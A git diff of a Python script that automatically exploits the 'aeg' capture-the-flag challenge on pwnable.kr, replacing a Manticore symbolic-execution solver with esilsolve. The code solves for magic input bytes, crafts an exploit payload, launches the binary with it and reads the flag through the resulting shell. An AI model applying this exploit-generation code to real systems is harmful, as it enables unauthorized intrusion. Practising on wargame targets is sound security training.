@@ -1,18 +1,7 @@
 #!/usr/bin/env python
-# solve aeg on pwnable.kr with manticore
-# its not fast enough but ima try to change that (read below)
-# original angr solution runs in ~9 secs
-# (new solution runs in ~5!)
-
-# solution with auto_load=False and newest version
-# of manticore is EVEN FASTER than angr
-
-# this solution works more often however
-# sometimes the "stack" runs out of space
-# works 4 out of 5 times
-
-#from manticore.native import Manticore
-#from manticore.native.manticore import _make_linux as make_linux
+# solve aeg on pwnable.kr with esilsolve
+# its faster than manticore and angr
+# so thats cool
 
 from esilsolve import ESILSolver
 import esilsolve.solver as solver
@@ -27,53 +16,10 @@ import r2pipe
 
 context.arch='amd64'
 
-path = "./aeg_program2"
+path = "./aeg_program"
 r2p = None
 
 b = None
-
-def symbolic_execution(targets):
-    log.info("Starting symbolic execution...")
-
-    linux = make_linux(path, auto_load=False)
-
-    m = Manticore(linux)
-    m.verbosity(0) # change to 2 for debugging
-
-    buf_addr = targets["buf_addr"]
-
-    # reached the goal (memcpy call)
-    def reached_goal(state):
-        #print("Reached goal state.")
-        con_buf = state.solve_buffer(buf_addr, 48)
-        #print("BUF: %s" % con_buf)
-
-        with m.locked_context() as context:
-            context["magic_values"] = con_buf
-
-        m.terminate()
-
-    m.add_hook(targets["goal"], reached_goal)
-
-    #skip intro shit
-    def skip_intro(state):
-        buf = state.new_symbolic_buffer(48) # buffer we will solve
-        state.cpu.write_bytes(buf_addr, buf)
-        state.cpu.RIP = targets["check_start"]
-
-    m.add_hook(b.symbols[b"__libc_start_main"], skip_intro)
-
-    def constrain_jump(state):
-        state.constrain(state.cpu.ZF == 1) # never take jumps for failed solutions
-
-    for jne_addr in targets["jnes"]:
-        m.add_hook(jne_addr, constrain_jump)
-
-    m.run(procs=2) 
-
-    magic_values = m.context["magic_values"]
-
-    return magic_values
 
 def esilsolve_execution(targets):
     log.info("Starting esilsolve execution...")
@@ -90,9 +36,8 @@ def esilsolve_execution(targets):
     state.memory.write_bv(buf_addr, buf, buf_len)
 
     def constrain_jump(instr, newstate):
-        #print("%x" % (newstate.registers["rdi"].as_long()))
-        #print(newstate.memory.read(newstate.registers["rbp"].as_long()-4, 1))
-        newstate.solver.add(newstate.registers["zf"] == 1) # never take jumps for failed solutions
+        # never take jumps for failed solutions
+        newstate.solver.add(newstate.registers["zf"] == 1) 
 
     for jne_addr in targets["jnes"]:
         esilsolver.register_hook(jne_addr, constrain_jump)
@@ -106,7 +51,7 @@ def esilsolve_execution(targets):
         magic = list(solver.BV2Bytes(c))
         return magic
     else:
-            return []
+        return []
 
 def generate_exploit(magic, addr, last_mov, xors):
     log.info('Crafting final exploit')
@@ -145,8 +90,7 @@ def generate_exploit(magic, addr, last_mov, xors):
     exploit = format_input(magic + list(exp_str), xors)
     return exploit
 
-def download_program():
-    f = remote("pwnable.kr", 9005)
+def download_program(f):
 
     line = b"" 
     while b"wait..." not in line:
@@ -164,7 +108,7 @@ def download_program():
 
     log.info("Program decompressed and executable")
 
-    f.close()
+    #f.close()
 
 # parse objdump to get necessary info
 # not sexy but its overkill to do anything else
@@ -234,29 +178,21 @@ def format_input(input, xors):
     return res
 
 if __name__ == "__main__":
-    #download_program()
+    #f = remote("pwnable.kr", 9005)
+    #download_program(f)
+    #f.close()
 
     r2p = r2pipe.open(path, flags=["-2"])
-    r2p.cmd("e io.cache=true; aaa")
-
+    r2p.cmd("aaa")
     b = ELF(path)
 
     targets = parse_disassembly()
-
-    print()
     log.info("BUFFER ADDR: 0x%016x" % targets["buf_addr"])
-    print()
 
     magic = esilsolve_execution(targets)
     log.info("MAGIC: %s" % magic)
     exploit = generate_exploit(magic, targets["buf_addr"], targets["last_mov"], targets["xors"])
-
-    print()
     log.info("EXPLOIT: %s" % exploit)
-    print()
-
-    #gdb.debug([path, exploit], "b * 0x%016x\n" % (targets["goal"]+6))
-    #input()
 
     x = process([path, exploit])
     x.read()
@@ -264,3 +200,7 @@ if __name__ == "__main__":
     x.writeline("cat flag")
     log.info("FLAG: %s" % x.read().decode())
 
+    '''f.read()
+    f.writeline(exploit)
+    f.interactive()
+    f.close()'''
